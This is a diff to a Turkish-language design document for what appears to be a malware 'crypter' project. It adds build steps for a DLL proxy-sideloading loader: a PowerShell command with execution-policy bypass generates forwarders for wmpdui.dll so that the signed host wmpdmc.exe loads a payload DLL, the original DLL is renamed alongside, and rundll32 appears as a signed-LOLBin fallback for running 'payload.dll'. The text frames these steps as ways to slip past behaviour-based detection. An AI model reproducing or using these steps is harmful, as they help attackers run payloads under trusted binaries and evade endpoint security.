@@ -81,6 +81,20 @@ Proxy DLL gereksinimleri:
 Avantaj: process kimliği imzalı; process-tabanlı davranış kuralları büyük ölçüde
 atlanır. Dezavantaj: DLL yine taranır; host/sürüm bağımlılığı; davranış izleme.
 
+Paket otomasyonu:
+
+```powershell
+# host'un wmpdui.dll'den import ettiklerini çıkar ve forwarder .def üret
+powershell -ExecutionPolicy Bypass -File tools\gen_proxy_def.ps1 `
+  -HostExe C:\Windows\System32\wmpdmc.exe -Out crypter\dll-loader\proxy.def
+
+# proxy.def varsa build.rs otomatik linkler; yoksa DLL yalnızca DllMain/Run export eder
+cargo build -p crypter-dll --release --target x86_64-pc-windows-gnu
+```
+
+`proxy.def` forwarder'ları `ImportedName=real_wmpdui.ImportedName` biçimindedir;
+orijinal vendor DLL'i `real_wmpdui.dll` olarak host'un yanına koy.
+
 ### 3.2 Signed LOLBin (yedek)
 
 - `rundll32.exe payload.dll,Run`
